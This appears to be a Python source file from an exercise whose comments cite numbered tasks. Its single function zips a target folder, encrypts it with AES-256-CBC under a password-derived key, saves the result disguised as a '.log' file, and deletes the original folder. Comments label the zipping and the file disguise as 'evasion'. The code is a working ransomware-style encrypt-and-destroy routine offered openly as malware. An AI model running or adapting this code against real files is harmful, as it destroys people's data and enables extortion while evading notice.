import os
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

BLOCK_SIZE = 16  # AES block size

def pad(data):
    """PKCS#7 padding for AES."""
    pad_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([pad_len]) * pad_len

def encrypt_folder(folder_path, password):
    """Encrypt folder to 'malware_encrypted.log' (Task 3)."""
    try:
        # Create ZIP (evasion: hides file structure)
        shutil.make_archive('temp_archive', 'zip', folder_path)
        
        # Generate IV + key (Task 3: AES-256-CBC)
        iv = os.urandom(BLOCK_SIZE)
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(password.encode())
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend())
        encryptor = cipher.encryptor()
        with open('temp_archive.zip', 'rb') as f:
            ciphertext = iv + salt + encryptor.update(pad(f.read())) + encryptor.finalize()
        
        # Save as .log (Task 5: evasion)
        with open('malware_encrypted.log', 'wb') as f:
            f.write(ciphertext)
        
        # Cleanup
        os.remove('temp_archive.zip')
        shutil.rmtree(folder_path)
        return True
    except Exception as e:
        print(f"[!] Encryption failed: {e}")
        return False